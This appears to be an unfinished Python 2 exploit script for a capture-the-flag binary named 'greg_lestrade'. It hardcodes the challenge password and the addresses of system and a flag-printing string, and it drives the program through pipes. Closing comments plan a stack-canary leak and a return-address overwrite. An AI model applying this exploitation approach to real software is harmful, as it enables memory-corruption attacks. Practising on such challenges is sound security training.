from subprocess import Popen, PIPE

admin_pwd = "7h15_15_v3ry_53cr37_1_7h1nk"
#system_addr = 0x400700
#bin_cat_flag_addr = 0x400C04
target_addr= 0x400876
expected_ret_addr = 0x400B39

def pad_to_len(s):
    while (len(s)+1) % 0x100 != 0:
        s += "a"
    return s + "\n"

def read_menu(p):
    print p.stdout.readline()
    print p.stdout.readline()

def authenticate(p):
    print p.stdout.readline()
    print p.stdout.readline()
    print p.stdout.readline()
    print p.stdout.read(len("Credential : "))
    p.stdin.write(admin_pwd + "\n")

def send_admin_command(p, cmd):
    read_menu(p)
    p.stdin.write("1\n") # select 1) admin action
    print p.stdout.readline() # [*] Hello, admin
    print p.stdout.read(len("Give me your command :"))
    p.stdin.write(pad_to_len(cmd))
    x = p.stdout.readline()
    return x

p = Popen("./greg_lestrade", stdout=PIPE, stdin=PIPE)



authenticate(p)
x = send_admin_command(p, "aaa")
print x

#print p.stdout.readline()

# what do do:
# leak  stack canary
# over write:
# rv with addr of target
# canary with correct value